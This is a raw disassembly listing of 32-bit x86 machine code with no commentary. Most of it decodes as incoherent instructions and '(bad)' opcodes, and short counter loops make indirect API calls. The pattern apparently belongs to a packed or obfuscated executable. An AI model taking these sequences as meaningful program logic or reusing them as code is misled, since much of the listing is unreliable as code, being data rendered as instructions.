  40a181:	mov    bh,0xf5
  40a183:	ins    BYTE PTR es:[edi],dx
  40a184:	ds inc edi
  40a186:	pop    ebx
  40a187:	inc    ecx
  40a188:	jg     0x40a194
  40a18a:	add    edi,DWORD PTR [esi+0x3a]
  40a18d:	pop    ss
  40a18e:	loope  0x40a19b
  40a190:	xchg   ecx,eax
  40a191:	jp     0x40a134
  40a193:	in     al,0x5e
  40a195:	inc    ecx
  40a196:	pop    esp
  40a197:	cmp    BYTE PTR [edx+eax*4],dh
  40a19a:	sbb    eax,0x99b9d40f
  40a19f:	pop    eax
  40a1a0:	and    edx,DWORD PTR [edx+ebx*2-0x1102156]
  40a1a7:	call   0x8478:0xd64557a9
  40a1ae:	pop    esi
  40a1af:	test   BYTE PTR [edx-0x60c3f28e],dh
  40a1b5:	sub    DWORD PTR ds:0x28cdf4ae,0xffffffca
  40a1bc:	jmp    0x40a1aa
  40a1be:	xchg   esp,eax
  40a1bf:	test   al,0x5b
  40a1c1:	xchg   BYTE PTR [ecx+ecx*8-0xb5bc609],cl
  40a1c8:	addr16 cwde 
  40a1ca:	push   es
  40a1cb:	stos   DWORD PTR es:[edi],eax
  40a1cc:	cmp    esp,DWORD PTR [edi+0x7132ac03]
  40a1d2:	dec    esi
  40a1d3:	retf   
  40a1d4:	sbb    al,0xe7
  40a1d6:	stc    
  40a1d7:	xor    BYTE PTR [eax-0x50],al
  40a1da:	add    bh,BYTE PTR [ebx-0x70]
  40a1dd:	xor    dl,BYTE PTR [ebp-0x12]
  40a1e0:	stos   DWORD PTR es:[edi],eax
  40a1e1:	push   edx
  40a1e2:	adc    esi,DWORD PTR [ecx+0x53]
  40a1e5:	dec    ebp
  40a1e6:	and    DWORD PTR [eax+0x20],esi
  40a1e9:	aas    
  40a1ea:	mov    BYTE PTR [edx-0x2b],0x5c
  40a1ee:	inc    ebx
  40a1ef:	mov    dh,0x1d
  40a1f2:	pop    es
  40a1f3:	jno    0x40a219
  40a1f5:	pop    eax
  40a1f6:	call   0x77eb5ea7
  40a1fb:	pop    eax
  40a1fc:	pusha  
  40a1fd:	std    
  40a1fe:	inc    esi
  40a1ff:	jp     0x40a226
  40a201:	imul   edi,DWORD PTR ss:[eax+0x5562a5f0],0xffffff94
  40a209:	dec    ebp
  40a20a:	(bad)  
  40a20b:	in     eax,dx
  40a20c:	leave  
  40a20d:	cmp    dl,bl
  40a20f:	xchg   esp,eax
  40a210:	and    dh,al
  40a212:	adc    BYTE PTR ds:0xe4945c76,bl
  40a218:	xor    eax,0x73fd3624
  40a21d:	xor    BYTE PTR [ebp+0x2104d5e6],0xd5
  40a224:	ja     0x40a1f1
  40a226:	rcr    DWORD PTR [ecx-0x10],0xa4
  40a22a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a22b:	cld    
  40a22c:	or     edx,esp
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fced,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	sti    
  40a2c5:	cli    
  40a2c6:	mov    ch,BYTE PTR [ecx]
  40a2c8:	inc    ebp
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2cd
  40a2d1:	push   es
  40a2d2:	jg     0x40a2f7
  40a2d4:	jb     0x40a2c7
  40a2d6:	(bad)  
  40a2d7:	lds    esp,FWORD PTR [ecx-0xb]
  40a2da:	ins    DWORD PTR es:[edi],dx
  40a2db:	mov    bh,0x19
  40a2dd:	add    ch,cl
  40a2df:	inc    edx
  40a2e0:	push   edi
  40a2e1:	and    dl,BYTE PTR [edi-0x2c397d6]
  40a2e7:	cli    
  40a2e8:	test   DWORD PTR [edi],ecx
  40a2ea:	mov    dl,BYTE PTR [esi-0x1d]
  40a2ed:	xlat   BYTE PTR ds:[ebx]
  40a2ee:	imul   ebp,eax,0x114504ec
  40a2f4:	jg     0x40a2ce
  40a2f6:	mov    ch,0xda
  40a2f8:	out    dx,al
  40a2f9:	cmp    DWORD PTR [edi+0x62766f43],eax
  40a2ff:	loope  0x40a2f6
  40a301:	cwde   
  40a302:	inc    ebx
  40a303:	cmp    BYTE PTR [eax+0x2d],bh
  40a306:	aad    0x30
  40a308:	stos   DWORD PTR es:[edi],eax
  40a309:	mov    esp,0x1c93196a
  40a30e:	pop    ss
  40a30f:	(bad)  
  40a310:	out    dx,al
  40a311:	lds    edx,FWORD PTR [ebp-0x1a]
  40a314:	sbb    dl,ah
  40a316:	pop    ebx
  40a317:	and    esi,DWORD PTR [edi-0x3fd69fa4]
  40a31d:	mov    esi,0x8b504c93
  40a322:	ds inc ecx
  40a324:	or     al,0x4d
  40a326:	pop    ss
  40a327:	imul   DWORD PTR ds:0x9e98b8a0
  40a32d:	popa   
  40a32e:	sahf   
  40a32f:	in     eax,dx
  40a330:	jle    0x40a32b
  40a332:	adc    ch,BYTE PTR [esi-0x70]
  40a335:	out    dx,eax
  40a336:	lock test al,0x65
  40a339:	gs adc al,0x19
  40a33c:	popa   
  40a33d:	inc    sp
  40a33f:	and    al,0xe0
  40a341:	mov    WORD PTR [ebp+0x7b],es
  40a344:	loope  0x40a2d5
  40a346:	stc    
  40a347:	jmp    0xb1d:0xc3aece2f
  40a34e:	mov    edx,ecx
  40a350:	cmp    BYTE PTR ds:0xa8c7562b,ah
  40a356:	and    DWORD PTR [edx+edx*4],ebx
  40a359:	imul   ebx,ebp,0x66e321f3
  40a35f:	or     al,0x22
  40a361:	and    esp,DWORD PTR [edi-0x6f]
  40a364:	(bad)
  40a367:	add    esi,ecx
  40a369:	ja     0x40a337
  40a36b:	pop    ebx
  40a36c:	cmp    eax,0x888d529a
  40a371:	call   0x42e73fbe
  40a376:	cmp    eax,DWORD PTR [edx]
  40a378:	jl     0x40a35d
  40a37a:	push   edi
  40a37b:	loope  0x40a38a
  40a37d:	pop    ecx
  40a37e:	xor    al,0x6f
  40a380:	mov    esp,0x6a74f692
  40a385:	push   0xffffff99
  40a387:	add    edi,DWORD PTR [ebp+0x70]
  40a38a:	jo     0x40a3e4
  40a38c:	push   ss
  40a38d:	jno    0x40a3fc
  40a38f:	and    al,ah
  40a391:	and    al,BYTE PTR [ecx-0x56748c24]
  40a397:	xor    dl,al
  40a399:	xchg   esp,eax
  40a39a:	jg     0x40a3fb
  40a39c:	dec    eax
  40a39d:	aam    0x44
  40a39f:	dec    ebx
  40a3a0:	or     eax,esp
  40a3a2:	ficomp WORD PTR [edi-0x2270c648]
  40a3a8:	and    al,0x2e
  40a3aa:	das    
  40a3ab:	stc    
  40a3ac:	inc    ecx
  40a3ad:	leave  
  40a3ae:	neg    BYTE PTR ds:0xdb612e4
  40a3b4:	xor    edi,ebx
  40a3b6:	push   0x87070ea7
  40a3bb:	ret    0xbd0c
  40a3be:	clc    
  40a3bf:	jnp    0x40a3ac
  40a3c1:	cli    
  40a3c2:	lahf   
  40a3c3:	mov    esi,0x9059f691
  40a3c8:	mov    edi,gs
  40a3ca:	mov    dh,0xb8
  40a3cc:	push   0x2c
  40a3ce:	and    al,0xd6
  40a3d0:	fst    QWORD PTR [eax-0x53]
  40a3d3:	push   ebx
  40a3d4:	and    ebp,DWORD PTR [ebx-0x3916770]
  40a3da:	rcr    DWORD PTR [ecx-0x9],1
  40a3dd:	retf   
  40a3de:	pop    ecx
  40a3df:	ds jae 0x40a44f
  40a3e2:	je     0x40a3f4
  40a3e4:	push   ebp
  40a3e5:	mov    ebp,cs
  40a3e7:	mov    al,0xb0
  40a3e9:	cmp    eax,0xedd29a68
  40a3ee:	shr    DWORD PTR [edx-0x80],1
  40a3f1:	jnp    0x40a3a5
  40a3f3:	xchg   edi,eax
  40a3f4:	in     al,0x6d
  40a3f6:	mov    ds:0x3fb8ebc4,al
  40a3fb:	les    eax,FWORD PTR [ebp+0x58]
  40a3fe:	fwait
  40a3ff:	lods   eax,DWORD PTR ds:[esi]
  40a400:	mov    cl,0x65
  40a402:	add    cl,cl
  40a404:	push   0x5
  40a406:	rcl    BYTE PTR [ebx+ebp*1],0x80
  40a40a:	add    ebp,DWORD PTR [esi]
  40a40c:	mov    eax,0xdbcce4d2
  40a411:	push   esi
  40a412:	or     eax,0xe3b0ccc9
  40a417:	sub    al,0x29
  40a419:	sahf   
  40a41a:	pop    ebp
  40a41b:	jnp    0x40a452
  40a41d:	pop    ds
  40a41e:	or     eax,0x4002ee7
  40a423:	xchg   esp,eax
  40a424:	mov    esi,0xd386f85c
  40a429:	push   es
  40a42a:	sub    ah,BYTE PTR [esi]
  40a42c:	jo     0x40a3de
  40a42e:	push   es
  40a42f:	mov    eax,ds:0x5026d268
  40a434:	ret    0xb2cd
  40a437:	es jmp 0x4df7a1c
  40a43d:	hlt    
  40a43e:	(bad)  
  40a43f:	mov    eax,ds:0xae905233
  40a444:	imul   edi,edx,0xffffff81
  40a447:	ja     0x40a44a
  40a449:	(bad)  
  40a44a:	xchg   ecx,eax
  40a44b:	in     eax,0x57
  40a44d:	jb     0x40a477
  40a44f:	add    BYTE PTR ds:0x2513d0de,cl
  40a455:	pop    ebp
  40a456:	pop    ds
  40a457:	xor    al,0xa0
  40a459:	push   edx
  40a45a:	fs jae 0x40a44c
  40a45d:	xor    BYTE PTR [edi],ah
  40a45f:	or     BYTE PTR [ecx+ebp*4+0x72974906],al
  40a466:	dec    eax
  40a467:	mov    al,cl
  40a469:	mov    al,0x24
  40a46b:	jg     0x40a3ff
  40a46d:	push   esi
  40a46e:	ret    
  40a46f:	and    DWORD PTR [edi-0x6d],edx
  40a472:	out    0x16,eax
  40a474:	inc    ebx
  40a475:	ret    
  40a476:	mov    ebx,DWORD PTR [edi-0x15]
  40a479:	jbe    0x40a42c
  40a47b:	sub    dh,dh
  40a47d:	xor    ebx,ebp
  40a47f:	das    
  40a480:	sbb    dl,BYTE PTR [esi-0x2b]
  40a483:	jo     0x40a4ba
  40a485:	pop    eax
  40a486:	ret    
  40a487:	and    al,BYTE PTR [ecx+0x1]
  40a48a:	stos   DWORD PTR es:[edi],eax
  40a48b:	ja     0x40a4df
  40a48d:	(bad)  
  40a48f:	cwde   
  40a490:	int    0xb3
  40a492:	cmc    
  40a493:	ret    0xcc90
  40a496:	jnp    0x40a44f
  40a498:	inc    eax
  40a499:	arpl   WORD PTR [ecx],bp
  40a49b:	pop    eax
  40a49c:	fld    QWORD PTR [esi+0x22cb3f81]
  40a4a2:	retf   0xae7f
  40a4a5:	popa   
  40a4a6:	test   BYTE PTR [eax-0x25],ch
  40a4a9:	adc    al,0xdf
  40a4ab:	fild   WORD PTR [ecx-0x7e]
  40a4ae:	mov    ah,BYTE PTR [edi-0x1a]
  40a4b1:	or     al,0x16
  40a4b3:	mov    ds:0xe36373ad,al
  40a4b8:	repz jae 0x40a45f
  40a4bb:	dec    eax
  40a4bc:	call   0x6293aad5
  40a4c1:	ins    DWORD PTR es:[edi],dx
  40a4c2:	mov    al,0x91
  40a4c4:	adc    bh,BYTE PTR [edi]
  40a4c6:	in     al,0xea
  40a4c8:	stos   BYTE PTR es:[edi],al
  40a4c9:	cmp    ebp,DWORD PTR [esp+edx*4]
  40a4cc:	sub    DWORD PTR [edx-0x25],edx
  40a4cf:	add    BYTE PTR [ebp+0x78],bl
  40a4d2:	jle    0x40a471
  40a4d4:	out    0x3c,al
  40a4d6:	sub    ecx,ebp
  40a4d8:	ret    
  40a4d9:	push   0xca4ca37a
  40a4de:	push   ecx
  40a4df:	rcl    DWORD PTR ds:0x329de75,cl
  40a4e5:	sbb    esi,DWORD PTR [esi+eax*4-0x58608ccb]
  40a4ec:	adc    dh,ah
  40a4ee:	cmp    esi,DWORD PTR [esi-0x16]
  40a4f1:	test   eax,ebp
  40a4f3:	add    ebp,edx
  40a4f5:	and    al,0x6d
  40a4f7:	sbb    dl,BYTE PTR [esi+0x4e08d12a]
  40a4fd:	lahf   
  40a4fe:	retf   0xc8b9
  40a501:	pop    edx
  40a502:	cmp    BYTE PTR [edx],bl
  40a504:	mov    edx,0x7a0f2a94
  40a509:	mov    eax,ds:0xac489858
  40a50e:	mov    edi,0xd1138cab
  40a513:	pop    esp
  40a514:	ror    DWORD PTR [eax+0x27],cl
  40a517:	inc    edx
  40a518:	in     eax,dx
  40a519:	dec    eax
  40a51a:	outs   dx,BYTE PTR ds:[esi]
  40a51b:	rol    DWORD PTR ds:0x7d9c609f,0xda
  40a522:	outs   dx,DWORD PTR ds:[esi]
  40a523:	or     bh,bl
  40a525:	ret    
  40a526:	into   
  40a527:	dec    esi
  40a528:	dec    ecx
  40a529:	or     DWORD PTR [ecx-0x36],ecx
  40a52c:	(bad)  
  40a52d:	pushf  
  40a52e:	pop    edi
  40a52f:	add    BYTE PTR [ebp+0x8],bl
  40a532:	add    eax,DWORD PTR [ecx+esi*1-0xa]
  40a536:	div    BYTE PTR [ebx-0x15ac1779]
  40a53c:	loop   0x40a501
  40a53e:	icebp  
  40a53f:	lock mov ecx,0x45050e0f
  40a545:	xchg   esi,eax
  40a546:	or     BYTE PTR [edx+eiz*8-0x34],0xc6
  40a54b:	dec    edx
  40a54c:	mov    dl,0x71
  40a54e:	xor    edx,DWORD PTR [ebx+0x71]
  40a551:	pusha  
  40a552:	hlt    
  40a553:	adc    BYTE PTR [edi-0x5b222257],0xb1
  40a55a:	add    eax,0xe622a84e
  40a55f:	push   0xffffffe1
  40a561:	pop    es
  40a562:	pushf  
  40a563:	mov    eax,0x52a5d1d5
  40a568:	inc    edx
  40a569:	cmp    eax,0xba55168d
  40a56e:	rcl    DWORD PTR ds:0x7cdd8b7b,0xb3
  40a575:	sub    dl,BYTE PTR [ebp+0x27]
  40a578:	lods   eax,DWORD PTR ds:[esi]
  40a579:	push   edi
  40a57a:	cmp    ecx,esi
  40a57c:	push   eax
  40a57d:	outs   dx,DWORD PTR ds:[esi]
  40a57e:	add    al,0x33
  40a580:	std    
  40a581:	sti    
  40a582:	add    dh,al
  40a584:	sbb    BYTE PTR [edi],0x3d
  40a587:	and    BYTE PTR [edx-0x2717d0bf],bl
  40a58d:	inc    edi
  40a58e:	ficomp WORD PTR ds:0x9d24c6bf
  40a594:	pop    edx
  40a595:	repnz inc ecx
  40a597:	push   esi
  40a598:	(bad)  
  40a599:	and    al,0x5e
  40a59b:	inc    edi
  40a59c:	pop    ebp
  40a59d:	mov    dl,0x98
  40a59f:	sar    DWORD PTR [edi+0x1d],cl
  40a5a2:	dec    ebp
  40a5a3:	shl    BYTE PTR [edx-0x49],cl
  40a5a6:	or     DWORD PTR [edx+0x58],ecx
  40a5a9:	inc    esp
  40a5aa:	(bad)  
  40a5ab:	push   eax
  40a5ac:	cdq    
  40a5ad:	xor    esp,0x37cac458
  40a5b3:	in     al,0x7
  40a5b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5b6:	and    al,0xb5
  40a5b8:	ins    DWORD PTR es:[edi],dx
  40a5b9:	mov    al,0x28
  40a5bb:	cwde   
  40a5bc:	dec    edx
  40a5bd:	xchg   edx,eax
  40a5be:	xchg   BYTE PTR [esi-0x46b4d9d6],ah
  40a5c4:	outs   dx,BYTE PTR ds:[esi]
  40a5c5:	jno    0x40a598
  40a5c7:	dec    ebp
  40a5c8:	dec    eax
  40a5c9:	outs   dx,BYTE PTR ds:[esi]
  40a5ca:	xor    DWORD PTR [esi],esi
  40a5cc:	jae    0x40a5a9
  40a5ce:	(bad)  
  40a5cf:	sahf   
  40a5d0:	or     dl,BYTE PTR [ebx-0x6]
  40a5d3:	(bad)  
  40a5d5:	scas   eax,DWORD PTR es:[edi]
  40a5d6:	aas    
  40a5d7:	jb     0x40a56f
  40a5d9:	push   ecx
  40a5da:	ds test eax,0x4a93f2de
  40a5e0:	rol    DWORD PTR [edi+0x3b6cc65d],cl
  40a5e6:	pop    ebp
  40a5e7:	loope  0x40a5d5
  40a5e9:	cmp    DWORD PTR [eax-0x13],ebx
  40a5ec:	pop    ebx
  40a5ed:	iret   
  40a5ee:	or     DWORD PTR [esi-0xd3e1c32],ebx
  40a5f4:	fwait
  40a5f5:	mov    al,bl
  40a5f7:	push   cs
  40a5f8:	xor    eax,0xc1ecadb8
  40a5fd:	push   esi
  40a5fe:	and    dl,BYTE PTR [edx+0x6f1186df]
  40a604:	dec    edx
  40a605:	xor    DWORD PTR [ebx+0x4c],0xffffffd0
  40a609:	cld    
  40a60a:	xchg   ebp,eax
  40a60b:	icebp  
  40a60c:	xchg   BYTE PTR [ebp-0x72],bh
  40a60f:	or     eax,0xcfbbb109
  40a614:	dec    BYTE PTR [edx-0x3e]
  40a617:	stos   BYTE PTR es:[edi],al
  40a618:	push   ss
  40a619:	pop    ds
  40a61a:	mov    ebp,0x8a527964
  40a61f:	inc    edx
  40a620:	jnp    0x40a646
  40a622:	jb     0x40a5fc
  40a624:	in     eax,dx
  40a625:	ins    DWORD PTR es:[edi],dx
  40a626:	scas   al,BYTE PTR es:[edi]
  40a627:	pop    eax
  40a628:	mov    edx,0xfbef4400
  40a62d:	jne    0x40a5c5
  40a62f:	imul   eax,DWORD PTR [edx],0x67
  40a632:	in     al,dx
  40a633:	retf   
  40a634:	test   DWORD PTR [esi+ebp*2],ecx
  40a637:	ret    0x17f6
  40a63a:	dec    ebp
  40a63c:	(bad)  
  40a63d:	adc    edx,edi
  40a63f:	fsub   DWORD PTR [eax+eax*1+0x5827b9c5]
  40a646:	mov    ds:0x7da3145e,eax
  40a64b:	daa    
  40a64c:	lock and BYTE PTR [edx-0x558b9592],0xca
  40a654:	dec    esp
  40a655:	(bad)
  40a658:	cmc    
  40a659:	test   dh,dh
  40a65b:	jno    0x40a602
  40a65d:	jp     0x40a5fc
  40a65f:	out    0x3d,eax
  40a661:	iret   
  40a662:	sbb    al,0xb2
  40a664:	dec    eax
  40a665:	inc    edx
  40a666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a667:	pop    es
  40a668:	dec    esp
  40a669:	cli    
  40a66a:	dec    ebx
  40a66b:	inc    edi
  40a66c:	push   0xe6cc01b3
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	ja     0x40a867
  40a855:	xor    cl,BYTE PTR [esi+0x7070f1e4]
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a876
  40a860:	icebp  
  40a861:	sub    eax,0xdc0dfb02
  40a866:	in     eax,dx
  40a867:	mov    eax,0x98e68827
  40a86c:	ins    BYTE PTR es:[edi],dx
  40a86d:	fmul   DWORD PTR [esi]
  40a86f:	stc    
  40a870:	jge    0x40a843
  40a872:	cmp    cl,BYTE PTR [ebx]
  40a874:	and    edx,ecx
  40a876:	mov    bh,0x80
  40a878:	les    ebx,FWORD PTR [ebp-0x5060e095]
  40a87e:	dec    ebp
  40a87f:	pop    ebx
  40a880:	push   ecx
  40a881:	scas   eax,DWORD PTR es:[edi]
  40a882:	jno    0x40a8ce
  40a884:	dec    ebx
  40a885:	and    esi,esi
  40a887:	dec    DWORD PTR [edi+ecx*8]
  40a88a:	ja     0x40a856
  40a88c:	sub    edx,ecx
  40a88e:	loop   0x40a876
  40a890:	cs fucomi st,st(7)
  40a893:	neg    edx
  40a895:	adc    eax,0xffe8570e
  40a89a:	add    DWORD PTR [ecx-0x383f628a],0x67
  40a8a1:	clc    
  40a8a2:	xor    DWORD PTR [ebx],esi
  40a8a4:	mov    esp,0x2a57d187
  40a8a9:	mov    WORD PTR [ebx],ds
  40a8ab:	jle    0x40a918
  40a8ad:	clc    
  40a8ae:	lods   al,BYTE PTR ds:[esi]
  40a8af:	push   ds
  40a8b0:	out    0x3e,eax
  40a8b2:	inc    BYTE PTR ds:0xa4bb612d
  40a8b8:	push   edx
  40a8b9:	sar    BYTE PTR [edi-0x13],cl
  40a8bc:	es scas al,BYTE PTR es:[edi]
  40a8be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8bf:	outs   dx,DWORD PTR gs:[esi]
  40a8c1:	jbe    0x40a8a1
  40a8c3:	(bad)  
  40a8c4:	cmovo  esp,DWORD PTR [eax]
  40a8c7:	fcomip st,st(1)
  40a8c9:	sti    
  40a8ca:	aaa    
  40a8cb:	rcl    dh,0x44
  40a8ce:	je     0x40a935
  40a8d0:	xchg   ebp,ecx
  40a8d2:	add    ebx,edx
  40a8d4:	push   esp
  40a8d5:	push   ss
  40a8d6:	mov    ebp,0x7dcc1628
  40a8db:	test   DWORD PTR [edi+0x547c5061],eax
  40a8e1:	cmp    ch,dl
  40a8e3:	inc    ecx
  40a8e4:	ins    DWORD PTR es:[edi],dx
  40a8e5:	mov    dh,0x7b
  40a8e7:	cwde   
  40a8e8:	jmp    0x40a8fd
  40a8ea:	xchg   BYTE PTR [edx-0x37cb599c],bh
  40a8f0:	or     BYTE PTR [edi],dh
  40a8f2:	outs   dx,DWORD PTR ds:[esi]
  40a8f3:	pop    eax
  40a8f4:	adc    DWORD PTR [edx-0x17a76a4f],ecx
  40a8fa:	shl    DWORD PTR [ebp-0x772ae607],cl
  40a900:	out    dx,eax
  40a901:	and    al,dl
  40a903:	or     eax,0x2f40b186
  40a908:	xchg   edx,eax
  40a909:	sbb    edx,esp
  40a90b:	je     0x40a97a
  40a90d:	js     0x40a8a0
  40a90f:	(bad)  
  40a910:	lahf   
  40a911:	push   edx
  40a912:	inc    ebx
  40a913:	loope  0x40a8ab
  40a915:	retf   
  40a916:	xchg   ebp,eax
  40a917:	mov    edx,0x6dfad9a1
  40a91c:	jnp    0x40a908
  40a91e:	jmp    0x5514be2e
  40a923:	pusha  
  40a924:	jmp    0x1043a137
  40a929:	fldenv [edx+edi*4-0x225e7567]
  40a930:	pop    es
  40a931:	imul   ecx
  40a933:	mov    esi,0x4b1cf40c
  40a938:	xlat   BYTE PTR ds:[ebx]
  40a939:	ins    DWORD PTR es:[edi],dx
  40a93a:	push   ds
  40a93b:	mov    dl,0xc2
  40a93d:	dec    edx
  40a93e:	or     edi,DWORD PTR [esi]
  40a940:	xor    bh,BYTE PTR [ecx]
  40a942:	outs   dx,DWORD PTR ds:[esi]
  40a943:	(bad)  
  40a944:	cld    
  40a945:	call   0x969bef6a
  40a94a:	repz jmp 0x7475f36b
  40a950:	shl    bl,cl
  40a952:	and    ch,BYTE PTR [ecx+0x66]
  40a955:	mov    eax,ds:0x14a966d9
  40a95a:	out    0x80,eax
  40a95c:	fidiv  WORD PTR [edi+ebx*4-0x72]
  40a960:	mov    ch,0xfb
  40a962:	pop    ebx
  40a963:	jl     0x40a930
  40a965:	stos   DWORD PTR es:[edi],eax
  40a966:	ins    DWORD PTR es:[edi],dx
  40a967:	ja     0x40a9b7
  40a969:	aaa    
  40a96a:	lods   eax,DWORD PTR ds:[esi]
  40a96b:	xor    eax,0x5a92951f
  40a970:	gs sbb al,0x8b
  40a973:	ins    BYTE PTR es:[edi],dx
  40a974:	mov    edi,0xef21ed22
  40a979:	out    dx,eax
  40a97a:	repnz push edi
  40a97c:	out    0xa0,al
  40a97e:	mov    cl,0x74
  40a980:	inc    ecx
  40a981:	test   DWORD PTR [ebx+0x43],ecx
  40a984:	and    bh,ch
  40a986:	int    0x94
  40a988:	out    0xb5,al
  40a98a:	dec    edx
  40a98b:	loopne 0x40a96a
  40a98d:	sar    ah,0x89
  40a990:	iret   
  40a991:	xchg   edx,eax
  40a992:	jns    0x40a96b
  40a994:	lea    esi,[ebx+0x2d]
  40a997:	imul   esp,DWORD PTR [edx+0x0],0x7d
  40a99b:	or     ah,ch
  40a99d:	push   esp
  40a99e:	out    dx,eax
  40a99f:	aad    0x60
  40a9a1:	pop    eax
  40a9a2:	adc    BYTE PTR [ebp-0x70e85598],ah
  40a9a8:	mov    ebx,0x9ecbb7cb
  40a9ad:	or     bl,BYTE PTR [esi-0xd1768e6]
  40a9b3:	sub    ch,BYTE PTR [si-0x2c]
  40a9b7:	dec    ecx
  40a9b8:	retf   0x8d0b
  40a9bb:	sub    eax,0xac582af5
  40a9c0:	sbb    al,0x7c
  40a9c2:	pop    eax
  40a9c3:	popf   
  40a9c4:	jg     0x40a96d
